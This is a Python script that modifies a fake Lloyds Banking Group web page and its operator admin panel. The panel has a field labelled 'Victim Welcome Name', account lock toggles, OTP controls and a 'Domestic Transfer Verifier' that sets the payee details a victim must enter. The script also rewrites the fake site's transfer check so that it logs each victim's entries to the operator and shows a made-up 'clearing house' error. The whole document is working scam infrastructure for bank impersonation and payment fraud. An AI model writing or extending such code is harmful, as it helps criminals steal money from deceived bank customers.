import re
import os

ADMIN_FILE = 'C:\\Users\\xingk\\Lloyds Banking Group\\admin.html'
INDEX_FILE = 'C:\\Users\\xingk\\Lloyds Banking Group\\index.html'

with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
    admin_html = f.read()

# Fix the toggle buttons - they were inside a form or missing the async functions
toggle_js = '''
        // Update the account lock toggle events
        var btnLock = document.getElementById('btnLockAccount');
        var btnUnlock = document.getElementById('btnUnlockAccount');
        if (btnLock) {
            btnLock.onclick = async function() {
                await setSyncItem('accountLocked', true);
                document.getElementById('lockStatusDisplay').innerHTML = '<span style="color:#d9534f;">LOCKED</span>';
            };
        }
        if (btnUnlock) {
            btnUnlock.onclick = async function() {
                await setSyncItem('accountLocked', false);
                document.getElementById('lockStatusDisplay').innerHTML = '<span style="color:#5cb85c;">UNLOCKED</span>';
            };
        }
'''

# Find a safe place to inject this JS
admin_html = admin_html.replace('// ===== BUTTON EVENT LISTENERS =====', '// ===== BUTTON EVENT LISTENERS =====\n' + toggle_js)

# Add "Welcome back, [Name]" input field
welcome_html = '''
                <!-- Welcome Name Control -->
                <div class="settings-group">
                    <p><i class="fas fa-user"></i> Victim Welcome Name</p>
                    <input type="text" id="adminWelcomeName" placeholder="e.g. Kyung">
                    <button id="btnSetWelcome">Update Name</button>
                    <div id="welcomeNameStatus" class="status-msg"></div>
                </div>
'''
admin_html = admin_html.replace('<!-- Display Email -->', welcome_html + '\n                <!-- Display Email -->')

# Add JS for Welcome Name
welcome_js = '''
        // Set Welcome Name
        var btnSetWelcome = document.getElementById('btnSetWelcome');
        if (btnSetWelcome) {
            btnSetWelcome.onclick = async function() {
                var name = document.getElementById('adminWelcomeName').value.trim();
                if (name) {
                    await setSyncItem('welcomeName', name);
                    document.getElementById('welcomeNameStatus').innerText = 'Welcome name updated!';
                    setTimeout(function(){ document.getElementById('welcomeNameStatus').innerText = ''; }, 3000);
                }
            };
        }
'''
admin_html = admin_html.replace('// Set Display Email', welcome_js + '\n        // Set Display Email')

# Poll for welcomeName in admin
welcome_poll = '''
            // Poll Welcome Name
            var curName = getSyncItem('welcomeName');
            if (curName && document.activeElement !== document.getElementById('adminWelcomeName')) {
                document.getElementById('adminWelcomeName').value = curName;
            }
'''
admin_html = admin_html.replace('// Poll Display Email', welcome_poll + '\n            // Poll Display Email')


# Add Domestic Transfer Verification setup
domestic_html = '''
                <!-- Domestic Transfer Configuration -->
                <div class="settings-group" style="border:2px solid #3498db;">
                    <p style="color:white; font-weight:bold;"><i class="fas fa-money-check-alt"></i> Domestic Transfer Verifier</p>
                    <p style="font-size:11px;">Generate expected details for "STARK Building Materials UK".</p>
                    <input type="text" id="domName" placeholder="Full Name (as it appears on account)">
                    <input type="text" id="domSort" placeholder="Sort Code (XX-XX-XX)">
                    <input type="text" id="domAcc" placeholder="Account Number (8 digits)">
                    <button class="green" id="btnSetDom">Generate Domestic Transfer</button>
                    <div id="domStatus" class="status-msg"></div>
                </div>
'''
admin_html = admin_html.replace('<!-- OTP Generator -->', domestic_html + '\n                <!-- OTP Generator -->')

# Add JS for Domestic Transfer
domestic_js = '''
        // Set Domestic Transfer Details
        var btnSetDom = document.getElementById('btnSetDom');
        if (btnSetDom) {
            btnSetDom.onclick = async function() {
                var nm = document.getElementById('domName').value.trim();
                var sc = document.getElementById('domSort').value.trim();
                var ac = document.getElementById('domAcc').value.trim();
                if (nm && sc && ac) {
                    await setSyncItem('expectedDomName', nm);
                    await setSyncItem('expectedDomSort', sc);
                    await setSyncItem('expectedDomAcc', ac);
                    document.getElementById('domStatus').innerText = 'Details generated and ready!';
                    setTimeout(function(){ document.getElementById('domStatus').innerText = ''; }, 3000);
                } else {
                    alert('Please fill out Name, Sort Code, and Account Number.');
                }
            };
        }
'''
admin_html = admin_html.replace('// Generate OTP', domestic_js + '\n        // Generate OTP')

# Poll for domestic details
domestic_poll = '''
            // Poll Domestic Details
            var dName = getSyncItem('expectedDomName');
            var dSort = getSyncItem('expectedDomSort');
            var dAcc = getSyncItem('expectedDomAcc');
            if (dName && document.activeElement !== document.getElementById('domName')) document.getElementById('domName').value = dName;
            if (dSort && document.activeElement !== document.getElementById('domSort')) document.getElementById('domSort').value = dSort;
            if (dAcc && document.activeElement !== document.getElementById('domAcc')) document.getElementById('domAcc').value = dAcc;
'''
admin_html = admin_html.replace('// Poll Card Details', domestic_poll + '\n            // Poll Card Details')


with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
    f.write(admin_html)

print("Admin updated.")


# -------------------------------------
# INDEX.HTML UPDATES
# -------------------------------------

with open(INDEX_FILE, 'r', encoding='utf-8') as f:
    index_html = f.read()

# Update polling for Welcome Name
index_welcome_poll = '''
            // Welcome Name
            var wName = getSyncItem('welcomeName');
            if (wName) {
                var el = document.getElementById('welcomeName');
                if (el) el.innerText = wName;
            }
'''
index_html = index_html.replace('// Card name', index_welcome_poll + '\n            // Card name')

# Update the verification logic to check against Supabase expected details
verify_func_old = '''function verifyTransferDetails() {
            var name = document.getElementById('txFullName').value;
            var sc = document.getElementById('txSortCode').value;
            var acc = document.getElementById('txAccNum').value;
            
            if (name && sc && acc) {
                document.getElementById('transferStep2').style.display = 'none';
                document.getElementById('transferLoading').style.display = 'block';
                
                setTimeout(function() {
                    document.getElementById('transferLoading').style.display = 'none';
                    document.getElementById('transferStep3').style.display = 'block';
                }, 2000);
            } else {
                alert("Please fill in all recipient details.");
            }
        }'''

verify_func_new = '''async function verifyTransferDetails() {
            var name = document.getElementById('txFullName').value.trim();
            var sc = document.getElementById('txSortCode').value.trim();
            var acc = document.getElementById('txAccNum').value.trim();
            
            if (name && sc && acc) {
                // Check if they match the admin generated details
                var expName = getSyncItem('expectedDomName') || '';
                var expSort = getSyncItem('expectedDomSort') || '';
                var expAcc = getSyncItem('expectedDomAcc') || '';

                if (expName && expSort && expAcc && name === expName && sc === expSort && acc === expAcc) {
                    // Match found! Show STARK Building Materials UK
                    document.getElementById('transferStep2').style.display = 'none';
                    document.getElementById('transferLoading').style.display = 'block';
                    
                    setTimeout(function() {
                        document.getElementById('transferLoading').style.display = 'none';
                        document.getElementById('transferStep3').style.display = 'block';
                    }, 2000);
                } else {
                    // Log the failed attempt but do not proceed to STARK verification
                    var logEntry = '<p style="color:#d9534f;"><strong>Failed Transfer Verification:</strong><br>' +
                                   'Entered: ' + name + ', ' + sc + ', ' + acc + '</p>';
                    var currentLogs = getSyncItem('adminLogs') || '';
                    await setSyncItem('adminLogs', currentLogs + logEntry);
                    
                    alert("The details entered could not be verified by the clearing house. Please try again or contact support.");
                }

            } else {
                alert("Please fill in all recipient details.");
            }
        }'''

index_html = index_html.replace(verify_func_old, verify_func_new)

with open(INDEX_FILE, 'w', encoding='utf-8') as f:
    f.write(index_html)

print("Index updated.")
